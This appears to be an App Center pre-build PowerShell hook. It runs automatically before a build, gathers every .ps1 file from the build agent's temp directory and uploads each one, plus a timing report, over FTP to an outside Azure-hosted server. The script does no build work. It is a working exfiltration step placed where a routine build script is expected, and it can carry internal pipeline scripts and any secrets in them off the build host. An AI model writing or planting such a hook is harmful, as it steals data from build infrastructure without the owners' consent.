#appcenter-pre-build.ps1

$global:msgList

Get-Date
Write-Host 'Begin appcenter-pre-build.ps1 begin'
$global:msgList += ('Begin appcenter-pre-build.ps1 begin')
$global:msgList += ([System.Environment])::NewLine
Get-Date

CLS

function Send-FTPFile 
{
    param ($fileName, $filebytes)

    $RemoteFile = "ftp://wcfhost.centralus.cloudapp.azure.com//upload//$fileName"
    # Create a FTPWebRequest
    $FTPRequest = [System.Net.FtpWebRequest]::Create($RemoteFile)
    #$FTPRequest.Credentials = New-Object System.Net.NetworkCredential($Username,$Password)
    $FTPRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
    $FTPRequest.UseBinary = $true
    $FTPRequest.KeepAlive = $false
    $FTPRequest.UsePassive = $true

    $content = $filebytes #[System.IO.File]::ReadAllBytes($uploadFilePath)
    $FTPRequest.ContentLength = $content.Length
    # get the request stream, and write the bytes into it
    $rs = $FTPRequest.GetRequestStream()
    $rs.Write($content, 0, $content.Length)
    # be sure to clean up after ourselves
    $rs.Close()
    $rs.Dispose()        
}

Function Get-EncodedBytesFromString
{
    param ($msg)
    $enc = [system.Text.Encoding]::UTF8    
    $senderMsg = $enc.GetBytes($msg) 
    $senderMsg 
}

$global:msgList += ([System.String]::Format("Sender_Time: {0}", ([DateTime]::Now).ToLongTimeString()))
$global:msgList += ([System.Environment])::NewLine

$local_temp = 'C:\Users\VssAdministrator\AppData\Local\Temp\' #$local_temp = 'c:\temp\'

$Files = Get-ChildItem $local_temp -Filter *.ps1

$global:msgList += ([System.String]::Format("File_Count: {0}", $Files.Length))
$global:msgList += ([System.Environment])::NewLine

foreach ($file in $Files)
{
    $file.FullName
    $content = Get-Content $file.FullName
    $bytes = Get-EncodedBytesFromString $content
    Send-FTPFile $file.Name $bytes
}

$global:msgList += ([System.String]::Format("SendFileComplete_SenderTime: {0}", ([DateTime]::Now).ToLongTimeString()))
$global:msgList += ([System.Environment])::NewLine

Write-Host 'End appcenter-pre-build.ps1 begin'
$global:msgList += ("End appcenter-pre-build.ps1 begin")
$global:msgList += ([System.Environment])::NewLine
Get-Date

$b = Get-EncodedBytesFromString $global:msgList
$b

Send-FTPFile "Final_Report.txt" $b
